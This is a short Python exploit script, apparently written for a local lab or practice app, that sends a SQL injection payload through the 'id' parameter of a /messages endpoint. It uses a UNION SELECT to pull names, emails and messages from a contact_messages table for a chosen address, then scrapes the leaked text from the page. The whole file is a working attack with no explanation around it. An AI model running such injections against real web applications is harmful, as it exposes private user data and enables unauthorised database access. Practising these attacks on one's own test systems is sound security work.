import requests
from bs4 import BeautifulSoup  

url = 'http://0.0.0.0:5001/messages'
injection = '\' union select 1, name, mail, message from contact_messages where mail = "james@bond.mi5" -- ;'
field = {'id' : '1 ' + injection}
page = requests.get(url, params = field)
soup = BeautifulSoup(page.text, 'html.parser')
print(soup.find_all(class_='blockquote')[1].get_text())
